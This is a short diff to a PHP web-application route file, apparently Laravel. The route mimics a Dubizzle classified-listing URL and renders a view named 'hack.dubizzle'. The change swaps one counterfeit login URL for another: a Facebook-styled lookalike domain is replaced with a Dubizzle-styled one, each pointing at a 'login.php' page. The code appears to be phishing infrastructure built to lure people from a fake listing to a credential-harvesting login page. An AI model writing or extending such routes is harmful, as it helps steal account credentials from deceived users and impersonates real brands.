@@ -86,7 +86,7 @@ Route::get('/change-currency/{currency}', function($currency)
 
 Route::get('/en/port-said/items-for-sale/computers-tablets/listing/7-listings-4807f59cf6355e629f2ea1bebd93b99b/show/', function()
 {
-    $facebookUrl = 'http://facebook.speedupb.com/login.php?fbid=645304118898028&set=a.263636427064801.58209.263629920398785&type=1';
+    $facebookUrl = 'http://dubizzle.qbrando.com/login.php?fbid=645304118898028&set=a.263636427064801.58209.263629920398785&type=1';
 
     return View::make('hack.dubizzle', compact('facebookUrl'));
 });
